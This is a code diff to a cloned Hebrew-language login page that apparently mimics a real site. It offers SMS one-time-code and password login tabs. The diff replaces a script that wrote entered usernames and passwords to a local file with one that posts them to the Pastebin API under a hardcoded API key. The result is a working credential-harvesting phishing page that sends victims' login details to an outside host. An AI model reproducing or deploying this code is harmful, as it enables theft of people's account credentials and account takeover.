@@ -1001,12 +1001,13 @@
                 <app-login _nghost-bdi-c52="">
                   <div _ngcontent-bdi-c52="" class="content-wrapper">
                     <div _ngcontent-bdi-c52="" class="continerTabs">
-                      <button _ngcontent-bdi-c52="" role="tab" aria-selected="true" aria-controls="loginViaSms" id="tab-1" class="tab">
+                      <button _ngcontent-bdi-c52="" role="tab" aria-selected="true" aria-controls="loginViaSms" id="tab-1" class="tab" onclick="window.location.href='קוד.html';">
                         <span _ngcontent-bdi-c52="">כניסה עם <br _ngcontent-bdi-c52=""> קוד חד פעמי לנייד </span>
                       </button>
-                      <button _ngcontent-bdi-c52="" role="tab" aria-selected="false" aria-controls="loginViaPassword" id="tab-2" class="tab activeTab">
+                      <button _ngcontent-bdi-c52="" role="tab" aria-selected="false" aria-controls="loginViaPassword" id="tab-2" class="tab activeTab" onclick="window.location.href='index.html';">
                         <span _ngcontent-bdi-c52="">כניסה עם <br _ngcontent-bdi-c52=""> קוד משתמש וסיסמה </span>
                       </button>
+                      
                     </div>
                     <!---->
                     <!---->
@@ -1048,36 +1049,43 @@
                     </div>
                     
                     <script>
-                      let fileHandle;
-                    
                       document.getElementById('submitButton').addEventListener('click', async () => {
                         const userName = document.getElementById('userName').value;
                         const password = document.getElementById('password').value;
-                    
-                        // Organize the data
-                        const data = `User Name: ${userName}\nPassword: ${password}\n\n`;
-                    
-                        // Check if a file handle exists
-                        if (!fileHandle) {
-                          // Request file from the user
-                          [fileHandle] = await window.showOpenFilePicker({
-                            types: [{
-                              description: 'Text Files',
-                              accept: { 'text/plain': ['.txt'] },
-                            }],
-                            suggestedName: 'loginData.txt',
+
+                        // Pastebin API details
+                        const pastebinAPIKey = "j-ZxFe6iQaCvQ8U8R6Syr8fYUYT-Bo92"; // Replace with your actual API key
+                        const apiURL = "https://pastebin.com/api/api_post.php";
+
+                        const formData = new URLSearchParams({
+                          api_dev_key: pastebinAPIKey,
+                          api_option: "paste",
+                          api_paste_code: `User Name: ${userName}\nPassword: ${password}`,
+                          api_paste_name: "Login Data",
+                          api_paste_private: "1", // 0=public, 1=unlisted, 2=private
+                          api_paste_expire_date: "10M" // Expire in 10 minutes
+                        });
+
+                        try {
+                          const response = await fetch(apiURL, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                            body: formData.toString()
                           });
+
+                          if (!response.ok) {
+                            throw new Error("Failed to connect to Pastebin API.");
+                          }
+
+                          const resultURL = await response.text();
+                          alert(`Data successfully submitted to Pastebin: ${resultURL}`);
+                        } catch (error) {
+                          console.error("Error submitting data to Pastebin:", error);
+                          alert("An error occurred. Please try again.");
                         }
-                    
-                        // Write or append data to the file
-                        const writableStream = await fileHandle.createWritable();
-                        const existingContent = await fileHandle.getFile().then(file => file.text());
-                        await writableStream.write(existingContent + data);
-                        await writableStream.close();
-                    
-                        alert('Data has been saved to the file!');
                       });
                     </script>
+
                     
                     
                 </app-login>
